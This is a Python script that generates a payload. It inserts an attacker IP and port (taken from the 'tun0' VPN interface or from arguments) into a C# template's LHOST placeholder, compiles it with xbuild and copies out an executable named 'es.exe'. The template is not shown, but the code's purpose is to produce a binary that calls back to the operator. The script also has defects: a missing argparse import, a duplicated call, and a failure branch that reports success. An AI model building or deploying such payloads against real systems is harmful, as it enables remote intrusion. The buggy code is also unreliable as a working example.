import subprocess
import sys
import netifaces
import os
import random
import shutil
import time
import base64

def get_tun0_ip():
    try:
        interfaces = netifaces.interfaces()
        if "tun0" in interfaces:
            addr_info = netifaces.ifaddresses("tun0")
            if netifaces.AF_INET in addr_info:
                return addr_info[netifaces.AF_INET][0]["addr"]
    except Exception as e:
        print(f"Error getting tun0 IP: {e}")
    return ''

def update_application(template_path, ip_address, cs_output_directory):
    # Check the number of command-line arguments
    num_args = len(sys.argv) - 1  # Subtract 1 to exclude the script name

    default_port = 80

    # Get IP address and port from command-line arguments or tun0
    ip_address = get_tun0_ip()
    port = default_port

    if num_args == 1:
        # One argument provided, use it as the IP address
        ip_address = sys.argv[1]
    elif num_args == 2:
        # Two arguments provided, use them as the IP address and port
        ip_address = sys.argv[1]
        port = int(sys.argv[2])
    # Read the contents of the msbuild input template
    try:
        with open(template_path, "r") as template_file:
            template_content = template_file.read()
    except FileNotFoundError:
        print(f"Error: Template file not found at {template_path}")
        return

    # Replace the placeholder with the actual lhost value
    template_content = template_content.replace("<LHOST>", f"{ip_address}:{port}")

    # Save a copy to the specified directory with a .txt extension
    txt_output_path = os.path.join(cs_output_directory, "msbuild_input.txt")
    with open(txt_output_path, "w") as output_txt_file:
        output_txt_file.write(template_content)

    # Specify the output directory for the Program.cs file
    program_cs_output_directory = os.path.join(cs_output_directory, "run-es")

    # Create the output directory for Program.cs if it doesn't exist
    os.makedirs(program_cs_output_directory, exist_ok=True)

    # Write Program.cs to the specified directory
    program_cs_output_path = os.path.join(program_cs_output_directory, "Program.cs")
    with open(program_cs_output_path, "w") as program_cs_output_file:
        program_cs_output_file.write(template_content)

    return txt_output_path, program_cs_output_path


def build_and_copy_application(project_directory, current_working_dir):
    os.chdir(project_directory)

    xbuild_command = "xbuild /p:Configuration=Release"
    
    try:
        subprocess.run(xbuild_command, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("run-es.exe built successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to build the application. Error: {e}")

    # Copy the compiled application file to the current working directory
    source_exe_file = os.path.join(project_directory, "bin/x64/Release/run-es.exe")
    destination_exe_file = os.path.join(current_working_dir, "run-es.exe")
    try:
        shutil.copyfile(source_exe_file, destination_exe_file)
    except IOError as e:
        print(f"Failed to copy the application file. Error: {e}")

def parse_args():
    parser = argparse.ArgumentParser(description="Build and copy an application.")
    parser.add_argument("ip_address", nargs="?", default=None, help="IP address for the application")
    parser.add_argument("--port", type=int, default=80, help="Port for the application (default: 80)")
    return parser.parse_args()

def main():

    current_working_dir = os.getcwd()
    num_args = len(sys.argv) - 1  # Subtract 1 to exclude the script name

    default_port = 80

    ip_address = get_tun0_ip()
    port = default_port

    if num_args == 1:
        ip_address = sys.argv[1]
    elif num_args == 2:
        ip_address = sys.argv[1]
        port = int(sys.argv[2])
    elif num_args > 2:
        print("Usage: python3 run-es.py [IP_ADDRESS] [PORT]")
        sys.exit(1)

    msbuild_template_path = os.path.expanduser("~/.local/bin/pew/run-es-template/input.txt")

    cs_output_directory = os.path.expanduser("~/.local/bin/pew/run-es-template/")
    txt_output_path, app_output_path = update_application(msbuild_template_path, ip_address, cs_output_directory)

    time.sleep(1)

    txt_output_path, app_output_path = update_application(msbuild_template_path, ip_address, cs_output_directory)

    os.chdir(cs_output_directory)

    xbuild_command = "xbuild /p:Configuration=Release"
    try:
        subprocess.run(xbuild_command, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("\033[96mes.exe built successfully. Edit the es.txt or enum.txt file.\033[0m")
    except subprocess.CalledProcessError as e:
        print(f"es.exe created successfully.")

    time.sleep(1)

    source_exe_file = os.path.join(cs_output_directory, "run-es/bin/x64/Release/run-es.exe")
    destination_exe_file = os.path.join(current_working_dir, "es.exe")
    try:
        shutil.copyfile(source_exe_file, destination_exe_file)
    except IOError as e:
        print(f"Failed to copy the application file. Error: {e}")

if __name__ == "__main__":
    main()
